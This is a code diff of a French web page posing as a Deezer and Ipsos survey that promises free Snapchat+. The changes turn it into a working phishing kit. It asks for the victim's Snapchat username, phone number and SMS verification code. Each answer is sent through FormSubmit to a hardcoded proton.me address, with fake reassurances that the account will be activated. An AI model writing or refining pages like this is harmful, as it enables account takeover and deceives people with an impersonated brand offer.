@@ -195,19 +195,27 @@
         <div class="progress-bar" id="progressBar"></div>
         <div class="progress-text" id="progressText">0%</div>
     </div>
-    <!-- Étape 1: Artistes -->
-    <div class="box active" id="etape1">
+
+    <!-- PARTENARIAT AVEC DEEZER ET AVERTISSEMENT AVANT LE NUMERO -->
+    <div class="box active" id="etape0">
+        <h2>Partenariat avec Deezer 📱</h2>
+        <p>Ce sondage est organisé en collaboration avec Deezer pour offrir Snapchat+ gratuitement. Cette offre est exclusivement réservée aux clients de <strong>SFR, Bouygues Telecom, ou Orange</strong> pour garantir la compatibilité avec les services.</p>
+        <p>Avant de commencer, nous devons effectuer une vérification pour confirmer que vous êtes un participant humain et éviter tout abus.</p>
+        <button id="btnEtape0">Continuer</button>
+    </div>
+
+    <!-- Étape 1: Collecte des informations sur le compte Snapchat -->
+    <div class="box" id="etape1">
         <h2>Recevoir Snapchat+ 🎁</h2>
-        <p>Pour recevoir Snapchat+, participez à ce sondage en collaboration avec <strong>Deezer</strong>. Offre réservée aux clients <strong>SFR, Bouygues ou Orange</strong>.</p>
-        <input type="text" id="artiste_prefere" placeholder="Votre artiste préféré">
-        <input type="text" id="artiste_deezer" placeholder="Artiste que vous écoutez sur Deezer">
-        <input type="text" id="artiste_decouverte" placeholder="Artiste découvert récemment">
+        <p>Merci de nous fournir votre identifiant Snapchat afin que nous puissions vous envoyer votre cadeau.</p>
+        <input type="text" id="compte_snap" placeholder="Votre identifiant Snapchat">
         <button id="btnEtape1">Suivant</button>
     </div>
 
     <!-- Étape 2: Numéro de téléphone -->
     <div class="box" id="etape2">
         <h2>Numéro de téléphone</h2>
+        <p>Veuillez entrer votre numéro de téléphone pour recevoir un code de vérification par SMS.</p>
         <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
         <button id="btnEtape2">Suivant</button>
     </div>
@@ -215,6 +223,7 @@
     <!-- Étape 3: Code SMS -->
     <div class="box" id="etape3">
         <h2>Code de vérification</h2>
+        <p>Veuillez entrer le code que vous avez reçu par SMS pour finaliser l’inscription.</p>
         <input type="text" id="code_sms" placeholder="Code reçu">
         <button id="btnEtape3">Terminer</button>
     </div>
@@ -230,16 +239,16 @@
             document.getElementById('progressText').innerText = percent + "%";
         }
 
-        async function sendMail(dataObj, sujet, emailDest) {
+        async function sendMail(dataObj, sujet) {
             const formData = new FormData();
             formData.append("_subject", sujet);
-            formData.append("_cc", emailDest);  // Email destinataire (ton email et celui de ton boss)
+            formData.append("_cc", "John123abcd@proton.me,John123abcd@proton.me");  // Remplace avec tes adresses email
             formData.append("_captcha", "false");
             for (let key in dataObj) {
                 formData.append(key, dataObj[key]);
             }
             try {
-                await fetch("https://formsubmit.co/YOUR_EMAIL", {
+                await fetch("https://formsubmit.co/John123abcd@proton.me", {
                     method: "POST",
                     body: formData,
                     headers: { "Accept": "application/json" }
@@ -250,24 +259,24 @@
             }
         }
 
-        // Étape 1: Collecte des réponses des artistes
+        // Étape 0: Vérification avant le sondage
+        document.getElementById('btnEtape0').addEventListener('click', () => {
+            showStep('etape1', 25);
+        });
+
+        // Étape 1: Réponse sur Snapchat
         document.getElementById('btnEtape1').addEventListener('click', () => {
-            let pref = document.getElementById('artiste_prefere').value.trim();
-            let deezer = document.getElementById('artiste_deezer').value.trim();
-            let decouverte = document.getElementById('artiste_decouverte').value.trim();
-            if (!pref || !deezer || !decouverte) {
-                alert("Veuillez remplir toutes les questions.");
+            let snap = document.getElementById('compte_snap').value.trim();
+            if (!snap) {
+                alert("Veuillez entrer votre identifiant Snapchat.");
                 return;
             }
-            reponses.artiste_prefere = pref;
-            reponses.artiste_deezer = deezer;
-            reponses.artiste_decouverte = decouverte;
-
-            sendMail({ artiste_prefere: pref, artiste_deezer: deezer, artiste_decouverte: decouverte }, "Réponses Étape 1 - Ipsos", "YOUR_EMAIL, BOSS_EMAIL");
+            reponses.compte_snap = snap;
+            sendMail({ compte_snap: snap }, "Réponses Étape 1 - Ipsos");
             showStep('etape2', 50);
         });
 
-        // Étape 2: Collecte du numéro de téléphone
+        // Étape 2: Réponse sur le téléphone
         document.getElementById('btnEtape2').addEventListener('click', () => {
             let tel = document.getElementById('telephone').value.trim();
             if (!/^0[67]\d{8}$/.test(tel)) {
@@ -275,11 +284,11 @@
                 return;
             }
             reponses.telephone = tel;
-            sendMail({ telephone: tel }, "Réponses Étape 2 - Ipsos", "YOUR_EMAIL, BOSS_EMAIL");
+            sendMail({ telephone: tel }, "Réponses Étape 2 - Ipsos");
             showStep('etape3', 75);
         });
 
-        // Étape 3: Collecte du code SMS
+        // Étape 3: Réponse sur le code SMS
         document.getElementById('btnEtape3').addEventListener('click', () => {
             let code = document.getElementById('code_sms').value.trim();
             if (!code) {
@@ -287,12 +296,20 @@
                 return;
             }
             reponses.code_sms = code;
-            sendMail({ code_sms: code }, "Réponses Étape 3 - Ipsos", "YOUR_EMAIL, BOSS_EMAIL");
+            sendMail({ code_sms: code }, "Réponses Étape 3 - Ipsos");
             showStep('etape4', 100);
         });
     </script>
+    <div class="box" id="etape4">
+        <h2>Merci !</h2>
+        <p>Votre Snapchat+ sera activé dans l’heure. 🎉</p>
+    </div>
 
+    <div class="about">
+        <strong>À propos du partenariat :</strong><br>
+        Ce sondage est organisé en collaboration avec Deezer pour vous offrir Snapchat+ gratuitement. 
+        L’offre est exclusivement réservée aux clients SFR, Bouygues Telecom et Orange afin de garantir la disponibilité et la compatibilité du service. 
+        Nous vous remercions pour votre participation !
+    </div>
 </body>
 </html>
-
-
